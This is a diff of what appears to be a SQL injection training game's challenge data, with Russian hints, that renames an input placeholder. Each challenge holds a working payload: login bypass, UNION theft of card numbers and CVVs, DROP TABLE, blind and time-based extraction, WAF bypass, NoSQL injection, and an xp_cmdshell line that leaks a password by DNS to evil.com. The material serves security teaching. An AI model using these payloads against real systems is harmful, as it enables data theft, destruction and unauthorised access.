@@ -7,7 +7,7 @@ export const sqlChallenges = [
     level: 'Новичок',
     title: 'Обход аутентификации',
     description: 'Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.',
-    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'password123'`,
+    initialQuery: `SELECT * FROM users\nWHERE username = '[INPUT]'\n  AND password = 'password123'`,
     hint: 'Попробуйте закрыть строку с помощью одинарной кавычки и добавить условие, которое всегда истинно.',
     exampleInput: "' OR '1'='1",
     explanation:
@@ -19,7 +19,7 @@ export const sqlChallenges = [
     level: 'Новичок',
     title: 'Комментарий для обхода',
     description: 'Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.',
-    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'any'`,
+    initialQuery: `SELECT * FROM users\nWHERE username = '[INPUT]'\n  AND password = 'any'`,
     hint: 'Используйте символы -- (двойной дефис) для комментирования части запроса с паролем.',
     exampleInput: "admin'--",
     explanation:
@@ -31,7 +31,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'Извлечение данных через UNION',
     description: 'Используйте UNION SELECT для извлечения данных из таблицы credit_cards.',
-    initialQuery: `SELECT name, email FROM users\nWHERE name LIKE '%[ВВОД]%'`,
+    initialQuery: `SELECT name, email FROM users\nWHERE name LIKE '%[INPUT]%'`,
     hint: 'Закройте LIKE-выражение и добавьте UNION SELECT для выборки из другой таблицы. Количество столбцов должно совпадать.',
     exampleInput: "' UNION SELECT card_number, cvv FROM credit_cards--",
     explanation:
@@ -43,7 +43,7 @@ export const sqlChallenges = [
     level: 'Эксперт',
     title: 'Уничтожение данных (DROP TABLE)',
     description: 'Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.',
-    initialQuery: `SELECT * FROM products\nWHERE id = [ВВОД]`,
+    initialQuery: `SELECT * FROM products\nWHERE id = [INPUT]`,
     hint: 'Закройте числовое значение и добавьте точки с запятой для нового SQL-оператора.',
     exampleInput: "1; DROP TABLE products;--",
     explanation:
@@ -55,7 +55,7 @@ export const sqlChallenges = [
     level: 'Новичок',
     title: 'Error-based SQLi',
     description: 'Извлеките информацию о версии базы данных через сообщения об ошибках.',
-    initialQuery: `SELECT * FROM users\nWHERE id = '[ВВОД]'`,
+    initialQuery: `SELECT * FROM users\nWHERE id = '[INPUT]'`,
     hint: 'Попробуйте передать значение, которое вызовет ошибку преобразования типов, раскрывающую версию СУБД.',
     exampleInput: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
     explanation:
@@ -67,7 +67,7 @@ export const sqlChallenges = [
     level: 'Новичок',
     title: 'Boolean-based Blind SQLi',
     description: 'Определите, существует ли пользователь "admin", используя только ответы true/false от сервера.',
-    initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[ВВОД]%'`,
+    initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[INPUT]%'`,
     hint: 'Используйте условие, которое возвращает разные результаты для true и false. SUBSTRING() поможет посимвольно извлечь данные.',
     exampleInput: "' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--",
     explanation:
@@ -79,7 +79,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'Time-based Blind SQLi',
     description: 'Используйте задержки (SLEEP) для определения уязвимости, когда сервер не возвращает видимых различий.',
-    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    initialQuery: `SELECT * FROM users\nWHERE username = '[INPUT]'`,
     hint: 'Функция SLEEP(n) заставляет СУБД ждать n секунд. Используйте условную задержку: IF(condition, SLEEP(5), 0).',
     exampleInput: "' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
     explanation:
@@ -91,7 +91,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'Second-order SQLi',
     description: 'Внедрите SQL-инъекцию через регистрацию нового пользователя, которая сработает при изменении профиля.',
-    initialQuery: `-- Сначала данные сохраняются:\nINSERT INTO users (username, email)\nVALUES ('[ВВОД]', 'user@test.com')\n\n-- Потом используются без санитизации:\nSELECT * FROM users\nWHERE username = 'сохранённое_значение'`,
+    initialQuery: `-- Сначала данные сохраняются:\nINSERT INTO users (username, email)\nVALUES ('[INPUT]', 'user@test.com')\n\n-- Потом используются без санитизации:\nSELECT * FROM users\nWHERE username = 'сохранённое_значение'`,
     hint: 'При регистрации введите username, который при последующем использовании выполнит вредоносный SQL. Попробуйте: admin\\\'--',
     exampleInput: "admin'--",
     explanation:
@@ -103,7 +103,7 @@ export const sqlChallenges = [
     level: 'Эксперт',
     title: 'Out-of-band SQLi (OOB)',
     description: 'Извлеките данные через внешний DNS-запрос, когда прямой ответ сервера недоступен.',
-    initialQuery: `SELECT * FROM users\nWHERE id = [ВВОД]`,
+    initialQuery: `SELECT * FROM users\nWHERE id = [INPUT]`,
     hint: 'Функция xp_cmdshell (MSSQL) или LOAD_FILE (MySQL) может инициировать DNS-запрос к контролируемому вами домену.',
     exampleInput: "1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
     explanation:
@@ -115,7 +115,7 @@ export const sqlChallenges = [
     level: 'Эксперт',
     title: 'WAF Bypass — обход фильтрации',
     description: 'Обойдите Web Application Firewall, используя кодирование и обфускацию SQL-запроса.',
-    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    initialQuery: `SELECT * FROM users\nWHERE username = '[INPUT]'`,
     hint: 'WAF блокирует ключевые слова SELECT, UNION. Попробуйте: HEX-кодирование строк, CONCAT для обхода фильтра ключевых слов, комментарии /**/ для разбивки.',
     exampleInput: "'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
     explanation:
@@ -127,7 +127,7 @@ export const sqlChallenges = [
     level: 'Эксперт',
     title: 'Polyglot SQLi — универсальный пейлоад',
     description: 'Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.',
-    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    initialQuery: `SELECT * FROM users\nWHERE username = '[INPUT]'`,
     hint: 'Polyglot-пейлоад должен использовать синтаксис, валидный во всех СУБД. Используйте: -- для комментариев (работает везде), UNION SELECT, 0x для hex.',
     exampleInput: "1' UNION SELECT NULL,NULL,NULL-- -",
     explanation:
@@ -139,7 +139,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'NoSQL Injection — инъекция в MongoDB',
     description: 'Используйте операторы MongoDB ($gt, $ne) для обхода аутентификации в NoSQL базе данных.',
-    initialQuery: `db.users.findOne({\n  username: '[ВВОД]',\n  password: 'password123'\n})`,
+    initialQuery: `db.users.findOne({\n  username: '[INPUT]',\n  password: 'password123'\n})`,
     hint: 'В MongoDB можно передавать объекты вместо строк. Попробуйте: {"$gt": ""} — это означает "больше пустой строки" и всегда истинно для строк.',
     exampleInput: '{"$gt": ""}',
     explanation:
@@ -151,7 +151,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'ORDER BY Injection',
     description: 'Используйте инъекцию в параметре сортировки для извлечения данных через CASE-выражения.',
-    initialQuery: `SELECT name, email, role FROM users\nORDER BY [ВВОД]`,
+    initialQuery: `SELECT name, email, role FROM users\nORDER BY [INPUT]`,
     hint: 'Параметр сортировки обычно не санитизируется. Используйте CASE WHEN для boolean-based extraction: CASE WHEN (condition) THEN name ELSE email END.',
     exampleInput: "CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE email END",
     explanation:
@@ -187,7 +187,7 @@ export const sqlChallenges = [
     level: 'Продвинутый',
     title: 'SQL-инъекция через INSERT — запись в чужой аккаунт',
     description: 'Используйте инъекцию в INSERT-запросе для создания аккаунта с произвольными правами.',
-    initialQuery: `INSERT INTO users (username, email, role, active)\nVALUES ('[ВВОД]', 'user@test.com', 'user', 1)`,
+    initialQuery: `INSERT INTO users (username, email, role, active)\nVALUES ('[INPUT]', 'user@test.com', 'user', 1)`,
     hint: 'Закройте строку username и добавьте значения для дополнительных колонок через запятую.',
     exampleInput: "admin', 'admin@evil.com', 'admin', 1)--",
     explanation:
